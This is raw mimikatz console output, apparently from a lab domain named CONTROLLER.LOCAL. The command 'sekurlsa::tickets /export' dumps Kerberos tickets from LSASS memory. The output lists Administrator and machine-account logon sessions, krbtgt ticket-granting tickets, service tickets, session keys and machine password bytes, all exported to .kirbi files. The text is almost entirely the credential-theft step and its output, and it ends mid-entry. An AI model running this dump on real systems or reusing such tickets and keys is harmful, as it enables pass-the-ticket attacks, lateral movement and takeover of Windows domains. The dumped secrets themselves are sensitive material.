
get tickets from lsass
```sh
C:\Users\Administrator\Downloads>mimikatz.exe "sekurlsa::tickets /export"

  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # sekurlsa::tickets /export
 
Authentication Id : 0 ; 4027233 (00000000:003d7361)
Session           : NetworkCleartext from 0
User Name         : Administrator
Domain            : CONTROLLER
Logon Server      : CONTROLLER-1
Logon Time        : 8/15/2025 11:12:59 AM
SID               : S-1-5-21-432953485-3795405108-1502158860-500

         * Username : Administrator
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 8/15/2025 2:05:59 PM ; 8/15/2025 9:12:59 PM ; 8/22/2025 11:12:59 AM
           Service Name (02) : CONTROLLER-1 ; HTTPService.CONTROLLER.local:30222 ; @ CONTROLLER.LOCAL 
           Target Name  (02) : CONTROLLER-1 ; HTTPService.CONTROLLER.local:30222 ; @ CONTROLLER.LOCAL
           Client Name  (01) : Administrator ; @ CONTROLLER.LOCAL
           Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000017 - rc4_hmac_nt
             55494d807f8b4f86b4547b0f1070e7cf
           Ticket            : 0x00000017 - rc4_hmac_nt       ; kvno = 2        [...]
           * Saved to file [0;3d7361]-0-0-40a10000-Administrator@CONTROLLER-1-HTTPService.CONTROLLER.local~30222.kirbi !      
         [00000001]
           Start/End/MaxRenew: 8/15/2025 2:05:58 PM ; 8/15/2025 9:12:59 PM ; 8/22/2025 11:12:59 AM
           Service Name (02) : CONTROLLER-1 ; SQLService.CONTROLLER.local:30111 ; @ CONTROLLER.LOCAL
           Target Name  (02) : CONTROLLER-1 ; SQLService.CONTROLLER.local:30111 ; @ CONTROLLER.LOCAL
           Client Name  (01) : Administrator ; @ CONTROLLER.LOCAL
           Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000017 - rc4_hmac_nt
             1486d0b26fc0495fa530a3bb9672ae14
           Ticket            : 0x00000017 - rc4_hmac_nt       ; kvno = 2        [...]
           * Saved to file [0;3d7361]-0-1-40a10000-Administrator@CONTROLLER-1-SQLService.CONTROLLER.local~30111.kirbi !       

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 8/15/2025 11:12:59 AM ; 8/15/2025 9:12:59 PM ; 8/22/2025 11:12:59 AM
           Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Target Name  (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Client Name  (01) : Administrator ; @ CONTROLLER.LOCAL ( CONTROLLER.LOCAL )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             e32a23302f253f01be4a73e27f25cbb2b09b402607842d3a8ada9461bf74c3b2
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;3d7361]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi !

Authentication Id : 0 ; 4018961 (00000000:003d5311)
Session           : Service from 0
User Name         : sshd_4904
Domain            : VIRTUAL USERS
Logon Server      : (null)
Logon Time        : 8/15/2025 11:12:49 AM
SID               : S-1-5-111-3847866527-469524349-687026318-516638107-1125189541-4904

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : 8e 1f 5c 37 b0 6c 2d 64 50 9b 5f ac 1c 8e 10 e9 02 12 40 84 43 8d e8 42 c7 d9 56 e8 89 6a 9a 99 d8 8f e5
 5a 52 87 44 bc 48 6d fb ca 32 4b 05 55 e9 68 65 3f 54 7d 86 1b e5 94 ed a8 19 51 46 c3 7a ff ea bb d1 10 af ea c8 29 36 26 3a
 e7 68 9f 90 fd 97 ca 3a 01 25 67 19 12 07 0c d3 fd 84 8f d7 fb 53 08 ea b6 07 b0 17 0e d2 53 1f 87 a7 af f4 b1 53 ee 6e 3d 09
 d9 86 48 33 0a 69 d1 f6 2f a2 43 7a f6 d9 43 b4 2f b4 e3 9d 82 4d ce 11 c8 f9 3d 80 f2 38 ee 10 2d 29 55 4e 34 12 b7 84 f8 ce
 e6 c7 c5 7b ae 64 01 4c 8a 2b 7d 46 2a 54 29 40 50 fc 7c c3 67 ce 68 c6 d5 af 3f 8b dc 41 c8 cb eb c8 1d bf 43 62 2b f6 35 4e
 25 01 32 cc 61 71 86 46 ce 68 25 78 05 81 30 53 55 46 d4 49 65 ff f4 51 55 5d 14 a7 f8 5c 34 63 d9 fc ec cc 99

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 3577053 (00000000:003694dd)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 8/15/2025 10:58:42 AM
SID               : S-1-5-90-0-2

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : 8e 1f 5c 37 b0 6c 2d 64 50 9b 5f ac 1c 8e 10 e9 02 12 40 84 43 8d e8 42 c7 d9 56 e8 89 6a 9a 99 d8 8f e5
 5a 52 87 44 bc 48 6d fb ca 32 4b 05 55 e9 68 65 3f 54 7d 86 1b e5 94 ed a8 19 51 46 c3 7a ff ea bb d1 10 af ea c8 29 36 26 3a
 e7 68 9f 90 fd 97 ca 3a 01 25 67 19 12 07 0c d3 fd 84 8f d7 fb 53 08 ea b6 07 b0 17 0e d2 53 1f 87 a7 af f4 b1 53 ee 6e 3d 09
 d9 86 48 33 0a 69 d1 f6 2f a2 43 7a f6 d9 43 b4 2f b4 e3 9d 82 4d ce 11 c8 f9 3d 80 f2 38 ee 10 2d 29 55 4e 34 12 b7 84 f8 ce
 e6 c7 c5 7b ae 64 01 4c 8a 2b 7d 46 2a 54 29 40 50 fc 7c c3 67 ce 68 c6 d5 af 3f 8b dc 41 c8 cb eb c8 1d bf 43 62 2b f6 35 4e
 25 01 32 cc 61 71 86 46 ce 68 25 78 05 81 30 53 55 46 d4 49 65 ff f4 51 55 5d 14 a7 f8 5c 34 63 d9 fc ec cc 99

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 3575551 (00000000:00368eff)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 8/15/2025 10:58:42 AM
SID               : S-1-5-96-0-2

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : 8e 1f 5c 37 b0 6c 2d 64 50 9b 5f ac 1c 8e 10 e9 02 12 40 84 43 8d e8 42 c7 d9 56 e8 89 6a 9a 99 d8 8f e5
 5a 52 87 44 bc 48 6d fb ca 32 4b 05 55 e9 68 65 3f 54 7d 86 1b e5 94 ed a8 19 51 46 c3 7a ff ea bb d1 10 af ea c8 29 36 26 3a
 e7 68 9f 90 fd 97 ca 3a 01 25 67 19 12 07 0c d3 fd 84 8f d7 fb 53 08 ea b6 07 b0 17 0e d2 53 1f 87 a7 af f4 b1 53 ee 6e 3d 09
 d9 86 48 33 0a 69 d1 f6 2f a2 43 7a f6 d9 43 b4 2f b4 e3 9d 82 4d ce 11 c8 f9 3d 80 f2 38 ee 10 2d 29 55 4e 34 12 b7 84 f8 ce
 e6 c7 c5 7b ae 64 01 4c 8a 2b 7d 46 2a 54 29 40 50 fc 7c c3 67 ce 68 c6 d5 af 3f 8b dc 41 c8 cb eb c8 1d bf 43 62 2b f6 35 4e
 25 01 32 cc 61 71 86 46 ce 68 25 78 05 81 30 53 55 46 d4 49 65 ff f4 51 55 5d 14 a7 f8 5c 34 63 d9 fc ec cc 99

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 399780 (00000000:000619a4)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 8/15/2025 8:48:46 AM
SID               : S-1-5-18

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 8/15/2025 8:44:05 AM ; 8/15/2025 6:44:05 PM ;
           Service Name (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             9560b3cdd30e5c1951573ec453b539b6399bd92fdcbfdf4d54908d30ccd1daad
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;619a4]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi !

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 399571 (00000000:000618d3)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 8/15/2025 8:48:46 AM
SID               : S-1-5-18

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 8/15/2025 8:44:05 AM ; 8/15/2025 6:44:05 PM ;
           Service Name (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             9560b3cdd30e5c1951573ec453b539b6399bd92fdcbfdf4d54908d30ccd1daad
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;618d3]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi !

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 217869 (00000000:0003530d)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 8/15/2025 8:44:05 AM
SID               : S-1-5-18

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 8/15/2025 8:44:05 AM ; 8/15/2025 6:44:05 PM ;
           Service Name (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             9560b3cdd30e5c1951573ec453b539b6399bd92fdcbfdf4d54908d30ccd1daad
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3530d]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi !

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 60884 (00000000:0000edd4)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 8/15/2025 8:43:29 AM
SID               : S-1-5-90-0-1

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : 8e 1f 5c 37 b0 6c 2d 64 50 9b 5f ac 1c 8e 10 e9 02 12 40 84 43 8d e8 42 c7 d9 56 e8 89 6a 9a 99 d8 8f e5
 5a 52 87 44 bc 48 6d fb ca 32 4b 05 55 e9 68 65 3f 54 7d 86 1b e5 94 ed a8 19 51 46 c3 7a ff ea bb d1 10 af ea c8 29 36 26 3a
 e7 68 9f 90 fd 97 ca 3a 01 25 67 19 12 07 0c d3 fd 84 8f d7 fb 53 08 ea b6 07 b0 17 0e d2 53 1f 87 a7 af f4 b1 53 ee 6e 3d 09
 d9 86 48 33 0a 69 d1 f6 2f a2 43 7a f6 d9 43 b4 2f b4 e3 9d 82 4d ce 11 c8 f9 3d 80 f2 38 ee 10 2d 29 55 4e 34 12 b7 84 f8 ce
 e6 c7 c5 7b ae 64 01 4c 8a 2b 7d 46 2a 54 29 40 50 fc 7c c3 67 ce 68 c6 d5 af 3f 8b dc 41 c8 cb eb c8 1d bf 43 62 2b f6 35 4e
 25 01 32 cc 61 71 86 46 ce 68 25 78 05 81 30 53 55 46 d4 49 65 ff f4 51 55 5d 14 a7 f8 5c 34 63 d9 fc ec cc 99

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 8/15/2025 8:43:27 AM
SID               : S-1-5-20

         * Username : controller-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 8/15/2025 9:13:32 AM ; 8/15/2025 7:13:32 PM ; 8/22/2025 9:13:32 AM
           Service Name (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( CONTROLLER.LOCAL )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             8b79074e1768c2ac853fd6b0efd2df2b269328db8bae6e533cf22974fe425ae4
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e4]-0-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi !

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 8/15/2025 9:13:32 AM ; 8/15/2025 7:13:32 PM ; 8/22/2025 9:13:32 AM
           Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Target Name  (02) : krbtgt ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( CONTROLLER.local )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             78fffe3b3ff3779b22d00ec6160d34adf4cff561098c2d81ce8d99a70cbfb374
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;3e4]-2-0-40e10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi !

Authentication Id : 0 ; 33469 (00000000:000082bd)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 8/15/2025 8:43:26 AM
SID               : S-1-5-96-0-1

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : fe 09 4c 08 0b cb e9 93 22 f0 ac d0 03 6d 7a be dd 10 c4 32 a0 f9 14 72 e7 25 44 a7 23 39 a4 68 3b 82 9e
 60 ef d4 d3 5a 8a 21 90 fe 71 14 bb 16 cf 47 f1 d7 9b 3d e5 e3 da cf 67 7e 9b 36 32 75 87 57 1b fc 8e e9 4e f6 30 3d 88 24 6e
 4f 15 b9 f8 26 d3 d0 83 c0 67 1c b4 59 2e d6 bd 13 07 60 5e 07 e7 ea 6e cd 77 da 97 f6 69 ea 4c 6e 75 e7 25 04 a5 d2 1d 6e 8b
 d2 90 4e a1 1d 63 1d 02 22 42 a9 07 0b 1b bb f1 dc 6e 14 ed ab fa e4 3b 90 41 0b 87 bb a2 4d 27 77 7a b0 b2 22 c8 de 48 64 fd
 21 2e da df 68 cc e0 3a 04 67 8a 11 a2 f8 f4 b0 b0 d1 e3 51 04 f1 fe da c9 f6 85 eb f4 25 a3 52 2a 00 e8 25 d3 9a 08 31 27 86
 cd b3 fe 6e 40 f6 ed 59 03 fe b1 3a 98 bf f7 d5 6c 74 3e de 5d fb 15 f4 08 c9 2b fd 0f c7 e7 6a 79 38 2c 93 4b

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 33407 (00000000:0000827f)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 8/15/2025 8:43:26 AM
SID               : S-1-5-96-0-1

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : 8e 1f 5c 37 b0 6c 2d 64 50 9b 5f ac 1c 8e 10 e9 02 12 40 84 43 8d e8 42 c7 d9 56 e8 89 6a 9a 99 d8 8f e5
 5a 52 87 44 bc 48 6d fb ca 32 4b 05 55 e9 68 65 3f 54 7d 86 1b e5 94 ed a8 19 51 46 c3 7a ff ea bb d1 10 af ea c8 29 36 26 3a
 e7 68 9f 90 fd 97 ca 3a 01 25 67 19 12 07 0c d3 fd 84 8f d7 fb 53 08 ea b6 07 b0 17 0e d2 53 1f 87 a7 af f4 b1 53 ee 6e 3d 09
 d9 86 48 33 0a 69 d1 f6 2f a2 43 7a f6 d9 43 b4 2f b4 e3 9d 82 4d ce 11 c8 f9 3d 80 f2 38 ee 10 2d 29 55 4e 34 12 b7 84 f8 ce
 e6 c7 c5 7b ae 64 01 4c 8a 2b 7d 46 2a 54 29 40 50 fc 7c c3 67 ce 68 c6 d5 af 3f 8b dc 41 c8 cb eb c8 1d bf 43 62 2b f6 35 4e
 25 01 32 cc 61 71 86 46 ce 68 25 78 05 81 30 53 55 46 d4 49 65 ff f4 51 55 5d 14 a7 f8 5c 34 63 d9 fc ec cc 99

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 33258 (00000000:000081ea)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 8/15/2025 8:43:26 AM
SID               : S-1-5-96-0-0

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : 8e 1f 5c 37 b0 6c 2d 64 50 9b 5f ac 1c 8e 10 e9 02 12 40 84 43 8d e8 42 c7 d9 56 e8 89 6a 9a 99 d8 8f e5
 5a 52 87 44 bc 48 6d fb ca 32 4b 05 55 e9 68 65 3f 54 7d 86 1b e5 94 ed a8 19 51 46 c3 7a ff ea bb d1 10 af ea c8 29 36 26 3a
 e7 68 9f 90 fd 97 ca 3a 01 25 67 19 12 07 0c d3 fd 84 8f d7 fb 53 08 ea b6 07 b0 17 0e d2 53 1f 87 a7 af f4 b1 53 ee 6e 3d 09
 d9 86 48 33 0a 69 d1 f6 2f a2 43 7a f6 d9 43 b4 2f b4 e3 9d 82 4d ce 11 c8 f9 3d 80 f2 38 ee 10 2d 29 55 4e 34 12 b7 84 f8 ce
 e6 c7 c5 7b ae 64 01 4c 8a 2b 7d 46 2a 54 29 40 50 fc 7c c3 67 ce 68 c6 d5 af 3f 8b dc 41 c8 cb eb c8 1d bf 43 62 2b f6 35 4e
 25 01 32 cc 61 71 86 46 ce 68 25 78 05 81 30 53 55 46 d4 49 65 ff f4 51 55 5d 14 a7 f8 5c 34 63 d9 fc ec cc 99

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 3597073 (00000000:0036e311)
Session           : RemoteInteractive from 2
User Name         : Administrator
Domain            : CONTROLLER
Logon Server      : CONTROLLER-1
Logon Time        : 8/15/2025 10:58:44 AM
SID               : S-1-5-21-432953485-3795405108-1502158860-500

         * Username : Administrator
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 8/15/2025 10:58:44 AM ; 8/15/2025 8:58:44 PM ; 8/22/2025 10:58:44 AM
           Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL 
           Target Name  (02) : krbtgt ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Client Name  (01) : Administrator ; @ CONTROLLER.LOCAL ( CONTROLLER.local )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             9f0d128b6e43a956e57b97c0a009175d26888e7477b37053b9a6c59fe44f4ea8
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;36e311]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi !

Authentication Id : 0 ; 3577623 (00000000:00369717)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 8/15/2025 10:58:42 AM
SID               : S-1-5-90-0-2

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : 8e 1f 5c 37 b0 6c 2d 64 50 9b 5f ac 1c 8e 10 e9 02 12 40 84 43 8d e8 42 c7 d9 56 e8 89 6a 9a 99 d8 8f e5
 5a 52 87 44 bc 48 6d fb ca 32 4b 05 55 e9 68 65 3f 54 7d 86 1b e5 94 ed a8 19 51 46 c3 7a ff ea bb d1 10 af ea c8 29 36 26 3a
 e7 68 9f 90 fd 97 ca 3a 01 25 67 19 12 07 0c d3 fd 84 8f d7 fb 53 08 ea b6 07 b0 17 0e d2 53 1f 87 a7 af f4 b1 53 ee 6e 3d 09
 d9 86 48 33 0a 69 d1 f6 2f a2 43 7a f6 d9 43 b4 2f b4 e3 9d 82 4d ce 11 c8 f9 3d 80 f2 38 ee 10 2d 29 55 4e 34 12 b7 84 f8 ce
 e6 c7 c5 7b ae 64 01 4c 8a 2b 7d 46 2a 54 29 40 50 fc 7c c3 67 ce 68 c6 d5 af 3f 8b dc 41 c8 cb eb c8 1d bf 43 62 2b f6 35 4e
 25 01 32 cc 61 71 86 46 ce 68 25 78 05 81 30 53 55 46 d4 49 65 ff f4 51 55 5d 14 a7 f8 5c 34 63 d9 fc ec cc 99

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 3575595 (00000000:00368f2b)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 8/15/2025 10:58:42 AM
SID               : S-1-5-96-0-2

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : 8e 1f 5c 37 b0 6c 2d 64 50 9b 5f ac 1c 8e 10 e9 02 12 40 84 43 8d e8 42 c7 d9 56 e8 89 6a 9a 99 d8 8f e5
 5a 52 87 44 bc 48 6d fb ca 32 4b 05 55 e9 68 65 3f 54 7d 86 1b e5 94 ed a8 19 51 46 c3 7a ff ea bb d1 10 af ea c8 29 36 26 3a
 e7 68 9f 90 fd 97 ca 3a 01 25 67 19 12 07 0c d3 fd 84 8f d7 fb 53 08 ea b6 07 b0 17 0e d2 53 1f 87 a7 af f4 b1 53 ee 6e 3d 09
 d9 86 48 33 0a 69 d1 f6 2f a2 43 7a f6 d9 43 b4 2f b4 e3 9d 82 4d ce 11 c8 f9 3d 80 f2 38 ee 10 2d 29 55 4e 34 12 b7 84 f8 ce
 e6 c7 c5 7b ae 64 01 4c 8a 2b 7d 46 2a 54 29 40 50 fc 7c c3 67 ce 68 c6 d5 af 3f 8b dc 41 c8 cb eb c8 1d bf 43 62 2b f6 35 4e
 25 01 32 cc 61 71 86 46 ce 68 25 78 05 81 30 53 55 46 d4 49 65 ff f4 51 55 5d 14 a7 f8 5c 34 63 d9 fc ec cc 99
 
        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 2683394 (00000000:0028f202)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 8/15/2025 9:15:05 AM
SID               : S-1-5-18

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 8/15/2025 8:44:05 AM ; 8/15/2025 6:44:05 PM ; 8/22/2025 8:44:05 AM
           Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             4d2746474872c743234458d25f6f1e9d3cc357d68644d2b9404b2c75c36ede82
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;28f202]-2-0-60a10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi !

Authentication Id : 0 ; 1708981 (00000000:001a13b5)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 8/15/2025 8:58:36 AM
SID               : S-1-5-18

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 8/15/2025 8:58:36 AM ; 8/15/2025 6:44:05 PM ;
           Service Name (02) : GC ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             99a3b6d95b0ab701f6d27ff6833e8e0bc14f1f231fe66995072924a7706d5006
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;1a13b5]-1-0-40a50000-CONTROLLER-1$@GC-CONTROLLER-1.CONTROLLER.local.kirbi !

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 399723 (00000000:0006196b)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 8/15/2025 8:48:46 AM
SID               : S-1-5-18

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 8/15/2025 8:44:12 AM ; 8/15/2025 6:44:05 PM ;
           Service Name (02) : LDAP ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             9384245dea179773ad3536ee221a46b93f39a1d719d1b5db6441599524f51dfc
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;6196b]-1-0-40a50000-CONTROLLER-1$@LDAP-CONTROLLER-1.CONTROLLER.local.kirbi !

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 399663 (00000000:0006192f)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 8/15/2025 8:48:46 AM
SID               : S-1-5-18

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 8/15/2025 8:44:05 AM ; 8/15/2025 6:44:05 PM ;
           Service Name (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             9560b3cdd30e5c1951573ec453b539b6399bd92fdcbfdf4d54908d30ccd1daad
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;6192f]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi !

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 218769 (00000000:00035691)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
